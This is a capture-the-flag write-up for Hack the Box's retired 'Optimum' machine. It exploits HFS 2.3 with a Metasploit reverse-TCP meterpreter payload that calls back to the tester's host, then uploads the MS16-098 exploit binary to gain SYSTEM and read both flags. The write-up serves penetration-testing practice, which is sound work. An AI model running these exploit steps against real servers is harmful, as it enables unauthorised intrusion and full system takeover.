									Today we are going to solve another CTF challenge called “Optimum” which is categorized as a retired lab developed by Hack the Box for the purpose of online penetration practices. Solving this lab is not that tough if have proper basic knowledge of Penetration testing. Let’s start and learn how to breach it.
Level: Intermediate
Task: find user.txt and root.txt file on the victim’s machine.
Since these labs are online, therefore they have static IP. The IP of optimum is 10.10.10.8 so let’s start with nmap port enumeration.

		
		
			
			
			
			
nmap -A 10.10.10.8
			
				
					
				
					1
				
						nmap -A 10.10.10.8
					
				
			
		

From the given below image, you can observe that we found ports 80 is open for file sharing using HFS 2.3 in the victim’s network.

When I Googled relative exploit I found first link for Metasploit exploit.    

Then run the msfconsole command in terminal and load Metasploit framework to use the said exploit and for that type the following commands :

		
		
			
			
			
			
use exploit/windows/http/rejetto_hfs_exec
msf exploit(windows/http/rejetto_hfs_exec) &gt;set payload windows/x64/meterpreter/reverse_tcp
msf exploit(windows/http/rejetto_hfs_exec) &gt;set rhost 10.10.10.8
msf exploit(windows/http/rejetto_hfs_exec) &gt;set lhost 10.10.14.6
msf exploit(windows/http/rejetto_hfs_exec) &gt;set srvhost 10.10.14.6
msf exploit(windows/http/rejetto_hfs_exec) &gt;exploit
			
				
					
				
					123456
				
						use exploit/windows/http/rejetto_hfs_execmsf exploit(windows/http/rejetto_hfs_exec) &gt;set payload windows/x64/meterpreter/reverse_tcpmsf exploit(windows/http/rejetto_hfs_exec) &gt;set rhost 10.10.10.8msf exploit(windows/http/rejetto_hfs_exec) &gt;set lhost 10.10.14.6msf exploit(windows/http/rejetto_hfs_exec) &gt;set srvhost 10.10.14.6msf exploit(windows/http/rejetto_hfs_exec) &gt;exploit
					
				
			
		

And when it works perfectly, you will get a meterpreter session 1 as shown below and by running the sysinfo command you will know about the victim’s system information.

Now let’s complete this task by searching user.txt and root.txt flag which is hidden somewhere inside its directories.
Inside c:\Document and Setting \kostas\Desktop I found the user.txt file and used the cat command to read this file.
cat user.txt.txt
Great!! We got our 1st flag successfully.

To get root flag I really struggle a lot, all privilege escalation exploit suggested by recon/local_exploit_suggester did not work when I tried them.  Then I took help from Google and searched for exploit related to windows server and found many exploits, “MS16-098 exploit 41020” was among them.  I simply downloaded this .exe file and applied manual privilege escalation.

After downloading the exe file from Google, I transferred it to target’s machine via meterpreter session; with help of following commands:

		
		
			
			
			
			
meterpreter&gt; upload /root/Desktop/41020.exe .
meterpreter&gt; shell
			
				
					
				
					12
				
						meterpreter&gt; upload /root/Desktop/41020.exe .meterpreter&gt; shell
					
				
			
		

Then after executing the whoami command, it assured me “nt authority\system”

Inside c:\Document and Setting \Administrator\Desktop I found the root.txt file and used the type command to read the file.

		
		
			
			
			
			
type root.txt
			
				
					
				
					1
				
						type root.txt
					
				
			
		

Great!! We got our 2nd flag successfully
And this way, we successfully solved our challenge. YAY!
